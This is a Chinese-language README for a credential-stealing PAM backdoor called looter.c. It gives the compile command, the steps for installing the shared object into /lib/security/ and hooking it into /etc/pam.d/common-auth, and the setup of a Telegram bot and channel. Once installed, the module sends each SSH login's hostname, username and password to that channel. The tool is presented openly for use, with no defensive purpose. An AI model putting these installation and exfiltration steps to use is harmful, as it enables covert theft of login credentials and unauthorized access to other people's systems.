# 窃取主机SSH登录信息发送到Telegram频道中🤫

# 依赖
* gcc
* libcurl4-openssl-dev
* libpam0g-dev

# 配置
编辑 `looter.c` 主要修改2处：`Your_Bot_Token` 以及 `Your_Channel_Name`.

# 编译
```
gcc -Werror -Wall -fPIC -shared -Xlinker -x -o module.so looter.c -lcurl
```

# 使用
复制so到/lib/security/目录下【如果系统提示没有security这个目录，直接mkdir即可】
```
cp module.so /lib/security/
```
编辑/etc/pam.d/common-auth
```
vi /etc/pam.d/common-auth
```
在最底下新增如下两行
```
auth optional module.so
account optional module.so
```

## 如何获取Telegram Bot Token以及Channel Name？【手机版本演示】

#### 1.创建一个Telegram公共频道
1. 登录Telegram
2. 进入Chats标签页
3. 点击右上角的类似编辑的图标
4. 选择New Channel
5. 点击Create Channel
6. 后面相关信息自行填写即可
7. 完成Channel的创建

#### 2.通过BotFather创建一个Telegram BOT
1. 在搜索框搜索BotFather
2. 进入聊天界面
3. 在聊天输入框中选择/newbot
4. 接着按照提示创建bot即可
5. 看到返回“Done！Congratulations on your new bot”即表示完成bot的创建
6. 点击返回的类似t.me/aasxisobot的链接，接着点击下方的start
7. 复制第二行的token信息替换到c文件中Your_Bot_Token

#### 3.设置BOT为你频道的管理员
1. 进入第一步所创建的频道
2. 点击右上角的图标【进入频道主页】
3. 点击Administrators【进入管理员主页】
4. 点击Add Admin选择第二步创建的Bot，并且开启Add New Admins
5. 接着右上角的点击Done

结束，当有ssh登录该主机时候，Telegram频道将会收到登录信息【主机名、用户名、密码】。

🧐
